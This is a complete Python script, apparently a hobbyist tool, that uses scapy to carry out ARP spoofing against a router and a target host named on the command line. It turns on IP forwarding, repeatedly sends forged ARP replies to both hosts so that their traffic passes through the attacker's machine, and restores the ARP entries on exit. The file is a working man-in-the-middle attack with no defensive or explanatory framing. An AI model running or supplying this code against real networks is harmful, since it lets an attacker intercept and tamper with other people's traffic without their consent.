import scapy.all as scapy
import optparse as opt
import time

scapy.logging.getLogger("scapy.runtime").setLevel(scapy.logging.ERROR)

with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
    f.write("1")

def user_input():
    parser = opt.OptionParser()
    parser.add_option("-r", "--router", dest="router",help="router ip address")
    parser.add_option("-t", "--target", dest="target",help="target ip address")
    (options, arguments) = parser.parse_args()

    if not options.router or not options.target:
        parser.error("[-] Please enter --router and --target parameters.")

    return parser.parse_args()


def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    brodcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = brodcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1,verbose=False)[0]
    return answered_list[0][1].hwsrc


def arp_poisoning(fooled_ip,gateway_ip):
    target_mac = get_mac_address(fooled_ip)
    arp_respone = scapy.ARP(op=2,pdst=fooled_ip,hwdst=target_mac,psrc=gateway_ip)
    scapy.send(arp_respone,verbose=False)


def reset_operation(fooled_ip,gateway_ip):
    target_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_respone = scapy.ARP(op=2,pdst=fooled_ip,hwdst=target_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_respone,verbose=False,count=6)

numberOfPackets = 0

try:
    (options,arguments) = user_input()
    while True:     

        arp_poisoning(options.target,options.router)
        arp_poisoning(options.router,options.target)

        numberOfPackets += 2

        print("\rSending packets "+ str(numberOfPackets),end="")
        time.sleep(3)

except KeyboardInterrupt:
    print("\n[+] Exiting...")
    reset_operation(options.target,options.router)
    reset_operation(options.router,options.target)
